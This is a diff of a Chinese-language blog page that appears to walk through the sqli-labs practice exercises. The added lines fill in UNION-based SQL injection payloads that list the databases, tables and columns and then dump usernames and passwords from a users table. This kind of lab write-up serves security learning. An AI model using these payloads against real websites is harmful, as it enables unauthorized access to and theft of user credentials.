@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.2k</span>
+            <span class="post-count">1.3k</span>
         </span>
     </span>
 
@@ -252,11 +252,15 @@ SELECT * FROM `users` WHERE id=(&quot;1&quot;);#双引号加括号
 <h4 id="根据闭合类型进行联合查询"><a href="#根据闭合类型进行联合查询" class="headerlink" title="根据闭合类型进行联合查询"></a>根据闭合类型进行联合查询</h4><p>根据闭合类型再将1变为-1，再结合字段数利用union联合查询。</p>
 <p>union会执行两句话，而需要前面那句话为空（可将数字设为-1），后面的信息才可以显示出来。</p>
 <h4 id="爆库、爆表、爆列、爆数据"><a href="#爆库、爆表、爆列、爆数据" class="headerlink" title="爆库、爆表、爆列、爆数据"></a>爆库、爆表、爆列、爆数据</h4><p>利用sql注入层层爆破获取数据。命令参考第一关。</p>
-<p>爆库：union select 1,database()</p>
-<p>爆集合：union select 1,group_concat(schema_name),3 from information_schema.schemata –+</p>
+<p>爆库：union select 1,2,database()</p>
+<p>爆集合：union select 1,group_concat(schema_name),3 from information_schema.schemata </p>
 <p>爆表：</p>
-<p>爆列：</p>
-<p>爆数据：</p>
+<ul>
+<li>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</li>
+<li>union select 1,2, group_concat(table_name) from information_schema.columns where table_schema=database()</li>
+</ul>
+<p>爆列：union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database()</p>
+<p>爆数据：union select 1,group_concat(username),group_concat(password) from users –+</p>
 <h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>题目：</p>
 <img src="/source/images/%E8%A7%A3%E9%A2%98-sqli-labs/image-20211009151746244.png" alt="image-20211009151746244" style="zoom:33%;" />
 
